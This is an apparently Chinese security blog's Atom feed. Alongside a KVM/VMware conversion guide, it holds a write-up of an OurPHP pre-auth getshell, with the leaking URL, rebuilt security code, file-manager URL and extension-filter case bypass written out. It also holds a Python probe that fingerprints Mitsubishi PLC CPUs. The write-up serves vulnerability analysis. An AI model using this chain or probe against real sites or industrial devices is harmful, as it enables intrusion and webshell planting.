<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://hi-kk.github.io/</id>
    <title>KEYONE</title>
    <updated>2019-07-23T12:14:27.754Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://hi-kk.github.io/"/>
    <link rel="self" href="https://hi-kk.github.io//atom.xml"/>
    <subtitle>PenTesting&amp;Security Research &lt;br&gt;
LOVE &amp; PEACE ❤️JUST FOR FUN</subtitle>
    <logo>https://hi-kk.github.io//images/avatar.png</logo>
    <icon>https://hi-kk.github.io//favicon.ico</icon>
    <rights>All rights reserved 2019, KEYONE</rights>
    <entry>
        <title type="html"><![CDATA[CentOS下安装KVM环境及VMWare与KVM互相转换]]></title>
        <id>https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan</id>
        <link href="https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan">
        </link>
        <updated>2019-07-23T08:03:49.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>在最近的工作任务中，需要部署KVM虚拟环境，并尝试把以前在VMware下制作的虚拟机镜像转换成KVM支持的文件。之前也没接触过kvm，就网上搜索一番资料来试试看，幸运的是这次搜到的资料竟然一次成功，没有任何报错，简直感激涕零啊......索性把这个过程记录一下，分享出来，能少踩坑就少踩坑。</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>在最近的工作任务中，需要部署KVM虚拟环境，并尝试把以前在VMware下制作的虚拟机镜像转换成KVM支持的文件。之前也没接触过kvm，就网上搜索一番资料来试试看，幸运的是这次搜到的资料竟然一次成功，没有任何报错，简直感激涕零啊......索性把这个过程记录一下，分享出来，能少踩坑就少踩坑。</p>
<!-- more -->
<h2 id="前期检查">前期检查</h2>
<p><img src="https://hi-kk.github.io//post-images/1563870446694.png" alt=""><br>
无论在物理机还是虚拟机都应该启用CPU的虚拟化功能Intel-VT，以更好地运行KVM或者VMware虚拟机</p>
<h2 id="安装步骤">安装步骤</h2>
<ol>
<li>
<p>检查CPU特性<br>
<code>lscpu | grep vmx</code></p>
</li>
<li>
<p>安装一些基础软件包（非必须）<br>
<code>sudo yum install -y epel-release net-tools vim unzip zip wget ftp bridge-utils</code></p>
</li>
<li>
<p>安装KVM及相关工具</p>
</li>
</ol>
<pre><code>sudo yum install -y qemu-kvm libvirt
sudo yum install -y libguestfs-tools libguestfs-tools libguestfs-tools-c
</code></pre>
<ol start="4">
<li>验证安装结果</li>
</ol>
<pre><code>$ lsmod | grep ^kvm
kvm_intel             174250  0 
kvm                   570658  1 kvm_intel
</code></pre>
<ol start="5">
<li>启动服务并设置为开机自动运行</li>
</ol>
<pre><code>systemctl start libvirtd
systemctl enable libvirtd
</code></pre>
<ol start="6">
<li>检查服务状态</li>
</ol>
<pre><code>systemctl status libvirtd
systemctl is-enabled libvirtd
</code></pre>
<ol start="7">
<li>创建网络环境<br>
注意： 正常情况下，按之前的步骤一步步来是没有报错的，我这里实际测试也是如此，这时系统里已经有了virbr0这个网桥，则后面直接使用virbr0网桥即可。如果没有，就参看文末的引用链接原文寻找此处内容。</li>
</ol>
<h2 id="vmware转化kvm">VMware转化KVM</h2>
<ol>
<li>
<p>检查vmware虚拟机保存目录，查看是否为独立的vmdk文件，如果不是独立文件需要对其进行合并。还有，如果这台虚拟机有快照，需要将快照导出为完整虚拟机！</p>
</li>
<li>
<p>合并方法：以管理员身份运行cmd，进入到<br>
<code>C:\Program Files (x86)\VMware\VMware Workstation&gt;</code>（VMware安装目录，根据实际调整）<br>
用vmware自带的工具vmware- vdiskmanager.exe来合并多个文件，命令如下<code>vmware-vdiskmanager.exe -r &quot;C:\Winxp\Winxp.vmdk&quot; -t 0 &quot;C:\Winxp-vm.vmdk&quot;</code><br>
合并成功后，Winxpvm.vmdk就是合并后的独立文件。</p>
</li>
<li>
<p>将vmdk文件拷贝到KVM Linux主机，运行命令：<br>
<code>[root@localhost ~]# qemu-img convert Winxp-vm.vmdk -O qcow2 Winxp-kvm.img</code><br>
转化之后，Winxp-kvm.img就是可以导入KVM的镜像文件</p>
</li>
<li>
<p>启动virtmanager，导入镜像创建虚拟机。这时启动的虚拟机可能会发生蓝屏状况（windows虚拟机会有这种情况发生），你需要强制关闭蓝屏虚拟机。</p>
</li>
<li>
<p>导入注册表</p>
</li>
</ol>
<pre><code>[root@localhost ~]#wget https://github.com/jakobadam/kvm-mergeide/archive/master.zip

[root@localhost ~]#yum install qemu-img *libguestfs*'

[root@localhost kvm-mergeide-master]# virt-win-reg --merge XP mergeide.reg 
</code></pre>
<p>注意:这条命令里的XP是你之前创建kvm虚拟机的名称，virt-win-reg会自动搜索KVM中noactive的虚拟机名称，然后执行mergeide.reg。至此，转化已经完成<br>
<img src="https://hi-kk.github.io//post-images/1563872596863.png" alt=""></p>
<h2 id="kvm转化vmware">KVM转化VMWare</h2>
<ol>
<li>找到kvm虚拟机使用的img文件，将其转换成vmdk格式。<br>
<code>qemu-img convert testvm1.img –O vmdk /tmp/testvm1.vmdk</code></li>
<li>在VMware 里创建一个虚拟机，要和kvm环境虚拟机配置相同， 在创建磁盘那一步，选择”使用现有虚拟磁盘“，就是刚刚转换好的vmdk文件，再开启虚拟机就OK了。</li>
</ol>
<h2 id="引用">引用</h2>
<p><a href="https://blog.csdn.net/sch0120/article/details/83508879">在CentOS7上运行KVM虚拟机</a><br>
<a href="https://www.jianshu.com/p/eb8bccc28335">2019-02-21 VMware15在Ubuntu16.04安装使用及转换KVM</a><br>
<a href="https://blog.csdn.net/tianci_zzz/article/details/73896955">vmware虚拟机迁移到kvm</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[OurPHP20180718前台getshell分析]]></title>
        <id>https://hi-kk.github.io//post/ourphp20180718-qian-tai-getshell-fen-xi</id>
        <link href="https://hi-kk.github.io//post/ourphp20180718-qian-tai-getshell-fen-xi">
        </link>
        <updated>2019-04-30T06:10:09.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>影响范围：v1.7.5-v1.8.3</p>
</blockquote>
<p>先抛出payload，再进行代码分析</p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>影响范围：v1.7.5-v1.8.3</p>
</blockquote>
<p>先抛出payload，再进行代码分析</p>
<!--more-->
<h2 id="前台getshell">前台getshell</h2>
<p>首先，访问http://127.0.0.1/ourphp20180718/function/editor/php/upload_json.php?upload_file=1<br>
<img src="https://hi-kk.github.io//post-images/1563883458715.png" alt=""><br>
获取到：</p>
<pre><code>&lt;!--12345||7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1--&gt;
</code></pre>
<p>构造出：</p>
<pre><code>口令码：12345

安全校验码：7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ（跟上图比多了后面六个字符，具体看后面代码分析）
</code></pre>
<p>访问 <a href="http://127.0.0.1/ourphp20180718//client/manage/ourphp_filebox.php?op=home&amp;folder=./&amp;validation=12345&amp;code=7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ">http://127.0.0.1/ourphp20180718//client/manage/ourphp_filebox.php?op=home&amp;folder=./&amp;validation=12345&amp;code=7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ</a></p>
<p><img src="https://hi-kk.github.io//post-images/1563883485140.png" alt=""><br>
进行文件编辑，写入代码，修改后缀名，直接getshell</p>
<p><img src="https://hi-kk.github.io//post-images/1563883511409.png" alt=""></p>
<p><img src="https://hi-kk.github.io//post-images/1563883531172.png" alt=""></p>
<p><img src="https://hi-kk.github.io//post-images/1563883544692.png" alt=""></p>
<h2 id="代码分析">代码分析</h2>
<p>跟进 <code>function\editor\php\upload_json.php</code></p>
<p><img src="https://hi-kk.github.io//post-images/1563883560945.png" alt=""></p>
<p>继续跟进<code>uploadsafe()</code>函数，在<code>function\editor\php\JSON.php</code>238行</p>
<pre><code class="language-php">	function uploadsafe()
    {
		global $ourphp;
		return '&lt;!--'.$ourphp['validation'].'||'.substr($ourphp['safecode'], 0, 32).'--&gt;';
	}
</code></pre>
<p>由此可知，只要在前端给参数<code>upload_file</code>传任意值，就会返回<code>validation</code>口令码和<code>safecode</code>安全码的前32位</p>
<p>继续跟，看安全码是如何生成的，在<code>function\install\index.php</code>288行</p>
<pre><code class="language-php">$ourphp_safecode = getRandomString(32);
$safecode6 = substr($ourphp_safecode , 6 , 6);
$str_f = '$';
$str_tmp = &quot;&lt;?php
	/*
	 * Ourphp - CMS建站系统
	 * Copyright (C) 2014 ourphp.net
	 * 开发者：哈尔滨伟成科技有限公司
	 * -------------------------------
	 * 网站配置文件 (2016-10-22)
	 * -------------------------------
	 */

	define('OURPHPNO', true);
	define('WEB_ROOT',substr(dirname(__FILE__), 0, -7));

	include '&quot;.$mysql_file.&quot;';

	&quot;.$str_f.&quot;ourphp = array(
		'webpath' =&gt; '/',	// 网站路径
		'validation' =&gt; '12345',	// 口令码
		'adminpath' =&gt; 'client/manage',		// 管理员默认目录
		'mysqlurl' =&gt; '&quot;.$ourphp_dburl.&quot;',	// 数据库链接地址
		'mysqlname' =&gt; '&quot;.$ourphp_dbname.&quot;',	// 数据库登录账号
		'mysqlpass' =&gt; '&quot;.$ourphp_dbpass.&quot;',	// 数据库登录密码
		'mysqldb' =&gt; '&quot;.$ourphp_mydb.&quot;',	// 数据库表名
		'filesize' =&gt; '5000000',	// 附件上传最大值
		'safecode' =&gt; '&quot;.$ourphp_safecode.$safecode6.&quot;',	// 安全校验码
		'mysqltype' =&gt; '&quot;.$mysql_type.&quot;',
	);

	&quot;.$str_f.&quot;db = new OurPHP_Mysql(
		&quot;.$str_f.&quot;ourphp['mysqlurl'],
		&quot;.$str_f.&quot;ourphp['mysqlname'],
		&quot;.$str_f.&quot;ourphp['mysqlpass'],
		&quot;.$str_f.&quot;ourphp['mysqldb']
	);
?&gt;&quot;;
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563883610679.png" alt=""><br>
由此可知，安全码是通过随机取一个32位字符，然后取32位的第6位之后的6位字符，拼接到后面形成</p>
<p>由此就能得到后台访问的关键口令码和安全码</p>
<p>再跟后台的文件管理模块，在<code>\client\manage\ourphp_filebox.php</code>45行</p>
<p><img src="https://hi-kk.github.io//post-images/1563883622642.png" alt=""><br>
由此可知，只要口令码、安全校验码正确就可以对文件进行操作（编辑、重命名）</p>
<p>而且，835行的后缀名过滤，可用大小写绕过了</p>
<p><img src="https://hi-kk.github.io//post-images/1563883639438.png" alt=""><br>
至此，payload就可以构造好啦</p>
<blockquote>
<p>参考：https://xz.aliyun.com/t/4315</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python发送定制报文与回包取特定值]]></title>
        <id>https://hi-kk.github.io//post/python-fa-song-ding-zhi-bao-wen-yu-hui-bao-qu-te-ding-zhi</id>
        <link href="https://hi-kk.github.io//post/python-fa-song-ding-zhi-bao-wen-yu-hui-bao-qu-te-ding-zhi">
        </link>
        <updated>2019-04-19T02:22:15.000Z</updated>
        <summary type="html"><![CDATA[<p>-_- 无FCUK说....</p>
]]></summary>
        <content type="html"><![CDATA[<p>-_- 无FCUK说....</p>
<!--more-->
<p><img src="https://hi-kk.github.io//post-images/1563882268454.png" alt=""></p>
<h2 id="需求">需求</h2>
<p>使用Python编写一个脚本，实现向特定端口发送特定的探测payload报文，根据响应包，取特定字节范围的字符进行输出</p>
<h2 id="实例">实例</h2>
<p>这里就以工控设备：<strong>Mitsubishi（三菱） Q系列PLC CPU型号识别</strong> 作为案例<br>
其实，在之前写的文章 ** Nmap NSE开发之三菱Q系列PLC以太网识别** 之中已经可以得出大体的设计思路</p>
<ol>
<li>
<p>向设备的<code>5007</code> TCP端口，发送特定的识别数据报文<br>
<code>57000000001111070000ffff030000fe03000014001c080a0800000000000000040101010000000001</code><br>
<img src="https://hi-kk.github.io//post-images/1563882351879.png" alt=""></p>
</li>
<li>
<p>接受设备返回的数据报文，提取出特定字节范围的 <code>设备CPU信息</code><br>
<img src="https://hi-kk.github.io//post-images/1563882382138.png" alt=""><br>
这里直接给出python代码</p>
</li>
</ol>
<pre><code class="language-python">
# -*- coding: utf-8 -*-

from socket import *


if __name__==&quot;__main__&quot;:

	
	host='xx.xx.xx.xx'
	port=5007

	s = socket(AF_INET,SOCK_STREAM) #TCP发包
	s.connect((host,port))


	cmd=&quot;57000000001111070000ffff030000fe03000014001c080a0800000000000000040101010000000001&quot;
	
	s.send(cmd.decode('hex'))  #TCP发包

	#recv0_data=s.recvfrom(1024)

	res_list = []

	cur_data, _ = s.recvfrom(1024)

	for cur_chr in cur_data:
		res_list.append(cur_chr)

	cpuinfo = ''.join(res_list[35:55]) #取特定字节范围 CPUINFO

	print cpuinfo

	s.close()
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563882419533.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://hi-kk.github.io//post/hello-gridea</id>
        <link href="https://hi-kk.github.io//post/hello-gridea">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="http://hvenotes.fehey.com/">Gridea 主页</a><br>
<a href="http://fehey.com/">示例网站</a></p>
<h2 id="特性">特性👇</h2>
<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
<p>🏷️  你可以对文章进行标签分组</p>
<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
<p>💻  你可以在 <strong>𝖶𝗂𝗇𝖽𝗈𝗐𝗌</strong> 或 <strong>𝖬𝖺𝖼𝖮𝖲</strong> 设备上使用此客户端</p>
<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前🏃</p>
<p>未来，它一定会成为你离不开的伙伴</p>
<p>尽情发挥你的才华吧！</p>
<p>😘 Enjoy~</p>
]]></content>
    </entry>
</feed>